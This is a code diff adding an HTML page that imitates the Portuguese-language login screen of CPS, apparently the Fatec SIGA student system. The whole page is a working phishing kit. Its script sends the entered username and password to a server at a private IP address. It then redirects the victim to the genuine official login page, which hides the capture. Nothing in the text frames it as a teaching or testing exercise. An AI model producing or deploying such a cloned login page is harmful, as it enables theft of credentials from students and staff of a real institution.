@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login CPS</title>
+    <style>
+        body { margin: 0; font-family: Arial, sans-serif; background-color: white; }
+        header { background-color: #a7120d; height: 60px; display: flex; align-items: center; padding-left: 26px; color: white; font-weight: bold; }
+        .main-container { display: flex; margin-top: 85px; align-items: center; height: 300px; margin-left: 220px; }
+        .form-container { display: flex; flex-direction: column; gap: 15px; }
+        .form-group { display: flex; align-items: center; gap: 10px;}
+        label { width: 50px; font: 12px Verdana; color: #4169E1; text-align: left;}
+        #senha { width: 254px; height: 25px; border-radius: 4px; border: 1px solid #ccc; }
+        #usuario { width: 168px; height: 25px; border-radius: 4px; border: 1px solid #ccc; }
+        input:focus { outline: none; border: 2px solid black; box-shadow: 0 0 5px rgba(0, 191, 255, 0.6); }
+        button { margin-top: 15px; margin-left: 60px; width: 100px; padding: 8px; background-color: #284fcc; color: white; border: none; cursor: pointer; border: 1px solid #4169E1;}
+        button:hover { background:none; color: #4169E1; }
+        .link { margin-left: 60px; }
+        .link a { color: #1e3ca1; font-size: 12px; }
+        .link a:hover { color: red; }
+        .tentativas { border: 1px solid #ccc; border-top: 0.5px solid #ece9e9; padding: 14px; font: 53.3333px calibri; color: #4169E1; margin-bottom: 210px; margin-left: 220px; }
+        .tentativas small { display: block; font-size: 12px; color: #4169E1; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="./CPS_LogotipoMinimoNegativo.png" alt="CPS">
+</header>
+
+<div class="main-container">
+    <!-- Formulário -->
+    <div class="form-container">
+        <div class="form-group">
+            <label for="usuario">Usuário</label>
+            <input type="text" id="usuario" name="usuario">
+        </div>
+        <div class="form-group">
+            <label for="senha">Senha</label>
+            <input type="password" id="senha" name="senha">
+        </div>
+        <button id="btnLogin">Entrar</button>
+        <div class="link">
+            <a href="#">Soluções para problemas no Acesso</a>
+        </div>
+    </div>
+
+    <!-- Contador -->
+    <div class="tentativas">
+        5
+        <small>tentativas</small>
+    </div>
+</div>
+
+<script>
+document.getElementById("btnLogin").addEventListener("click", function() {
+    const usuario = document.getElementById("usuario").value;
+    const senha = document.getElementById("senha").value;
+
+    fetch("http://192.168.18.7:5000/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario: usuario, senha: senha })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Resposta do servidor:", data);
+            // Redireciona para o site oficial após enviar
+        window.location.href = "https://siga.cps.sp.gov.br/fatec/login.aspx";
+    })
+    .catch(error => {
+        console.error("Erro:", error);
+        alert("Não foi possível enviar os dados.");
+    });
+});
+</script>
+
+</body>
+</html>
